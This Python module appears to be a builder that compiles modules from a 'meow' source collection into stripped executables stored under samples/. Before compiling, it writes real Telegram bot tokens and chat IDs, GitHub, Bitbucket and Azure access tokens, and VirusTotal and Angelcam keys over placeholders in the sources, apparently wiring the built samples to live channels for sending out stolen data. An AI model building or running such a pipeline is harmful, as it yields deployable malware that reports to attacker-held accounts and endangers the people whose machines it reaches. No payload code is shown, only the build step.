"""
peekaboo standalone module compiler
reads meow sources (read-only), copies to temp, compiles, outputs to samples/
"""
from __future__ import annotations
import json
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Optional

_BASE    = Path(__file__).parent.parent
_CFG_DIR = _BASE / "config"
_SAMPLES = _BASE / "samples"

MINGW_FLAGS = [
    "-ffunction-sections", "-fdata-sections", "-Wno-write-strings",
    "-fno-exceptions", "-fmerge-all-constants",
    "-static-libstdc++", "-static-libgcc", "-fpermissive", "-s", "-O2",
]


def _load_cfg(name: str) -> dict:
    p = _CFG_DIR / f"{name}.json"
    if p.exists():
        try:
            return json.loads(p.read_text())
        except Exception:
            pass
    return {}


def _apply_credential_subs(src: str) -> str:
    subs: dict[str, str] = {}

    if re.search(r'telegram\.org|sendToTg|TELEGRAM', src, re.I):
        cfg = _load_cfg("telegram_config")
        if cfg.get("chat_id"):
            subs["TELEGRAM_CHAT_ID_PLACEHOLDER"] = cfg["chat_id"]
            subs["466662506"] = cfg["chat_id"]
        if cfg.get("bot_token") and "xxx" not in cfg.get("bot_token", ""):
            subs["TELEGRAM_BOT_TOKEN_PLACEHOLDER"] = cfg["bot_token"]

    if re.search(r'api\.github\.com|sendToGit|GITHUB', src, re.I):
        cfg = _load_cfg("github_config")
        if cfg.get("github_token"):
            subs["github_classic_token"] = cfg["github_token"]
            subs["GITHUB_TOKEN"] = cfg["github_token"]
        if cfg.get("repo_owner"):
            subs["GITHUB_REPO_OWNER_PLACEHOLDER"] = cfg["repo_owner"]
            subs["cocomelonc"] = cfg["repo_owner"]
        if cfg.get("repo_name"):
            subs["GITHUB_REPO_NAME_PLACEHOLDER"] = cfg["repo_name"]
            subs["ejpt"] = cfg["repo_name"]
        if cfg.get("issue_number"):
            subs["GITHUB_ISSUE_NUMBER_PLACEHOLDER"] = cfg["issue_number"]

    if re.search(r'bitbucket\.org|BITBUCKET', src, re.I):
        cfg = _load_cfg("bitbucket_config")
        if cfg.get("bitbucket_token_base64"):
            subs["BITBUCKET_TOKEN_PLACEHOLDER"] = cfg["bitbucket_token_base64"]

    if re.search(r'virustotal\.com|VT_API', src, re.I):
        cfg = _load_cfg("virustotal_config")
        if cfg.get("vt_api_key"):
            subs["VT_API_KEY_PLACEHOLDER"] = cfg["vt_api_key"]

    if re.search(r'dev\.azure\.com|AZURE', src, re.I):
        cfg = _load_cfg("azure_config")
        if cfg.get("azure_org"):
            subs["AZURE_ORG_PLACEHOLDER"] = cfg["azure_org"]
        if cfg.get("azure_project"):
            subs["AZURE_PROJECT_PLACEHOLDER"] = cfg["azure_project"]
        if cfg.get("azure_pat"):
            subs["AZURE_PAT_PLACEHOLDER"] = cfg["azure_pat"]

    if re.search(r'angelcam|ANGELCAM', src, re.I):
        cfg = _load_cfg("angelcam_config")
        if cfg.get("api_key"):
            subs["ANGELCAM_API_KEY_PLACEHOLDER"] = cfg["api_key"]

    for k, v in subs.items():
        if k and v:
            src = src.replace(k, v)
    return src


def _find_compiler(compiler_type: str) -> Optional[str]:
    candidates: dict[str, list[str]] = {
        "mingw-gcc": ["x86_64-w64-mingw32-gcc", "/usr/bin/x86_64-w64-mingw32-gcc"],
        "mingw-gpp": ["x86_64-w64-mingw32-g++", "/usr/bin/x86_64-w64-mingw32-g++"],
        "gcc":       ["gcc", "/usr/bin/gcc"],
        "gpp":       ["g++", "/usr/bin/g++"],
    }
    for c in candidates.get(compiler_type, []):
        if shutil.which(c) or Path(c).exists():
            return c
    return None


def compile_module(
    module_id: str,
    session_id: str,
) -> tuple[bool, str, Optional[Path]]:
    """
    Compile a single meow module standalone.
    Returns (success, log, output_path).
    Source files are copied to a temp dir - meow repo is never modified.
    """
    import sys
    sys.path.insert(0, str(Path(__file__).parent))
    import discovery

    mod = discovery.get_module(module_id)
    if not mod:
        return False, f"module not found: {module_id}", None
    if not mod.get("compilable", True):
        return False, f"not compilable (compiler: {mod['compiler']})", None

    src_path = Path(mod["src_path"])
    if not src_path.exists():
        return False, f"source missing: {src_path}", None

    compiler = _find_compiler(mod["compiler"])
    if not compiler:
        return False, f"compiler not installed: {mod['compiler']}", None

    out_dir = _SAMPLES / session_id
    out_dir.mkdir(parents=True, exist_ok=True)

    platform = mod["platform"]
    ext      = ".exe" if platform == "windows" else ""
    out_file = out_dir / f"{mod['slug']}{ext}"

    log: list[str] = []

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)

        # copy all source files (read-only meow stays untouched)
        for src_info in mod["all_sources"]:
            s = Path(src_info["path"])
            if s.exists():
                shutil.copy2(s, tmp / s.name)

        # apply credential substitutions to primary copy
        primary_tmp = tmp / src_path.name
        if primary_tmp.exists():
            try:
                text = primary_tmp.read_text(encoding="utf-8", errors="replace")
                primary_tmp.write_text(_apply_credential_subs(text), encoding="utf-8")
            except Exception as e:
                log.append(f"[warn] cred sub: {e}")

        extra_libs = mod.get("extra_libs", [])

        if mod["compiler"] in ("mingw-gcc", "mingw-gpp"):
            cmd = [compiler, *MINGW_FLAGS, str(primary_tmp), "-o", str(out_file)] + extra_libs
        else:
            cmd = [compiler, "-O2", "-s", str(primary_tmp), "-o", str(out_file)] + extra_libs

        log.append(f"[compile] {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.stdout:
                log.append(result.stdout)
            if result.stderr:
                log.append(result.stderr)
            if result.returncode == 0 and out_file.exists():
                size = out_file.stat().st_size
                log.append(f"[ok] {out_file.name} ({size:,} bytes)")
                return True, "\n".join(log), out_file
            log.append(f"[fail] rc={result.returncode}")
            return False, "\n".join(log), None
        except subprocess.TimeoutExpired:
            return False, "compilation timed out (60s)", None
        except Exception as e:
            return False, str(e), None
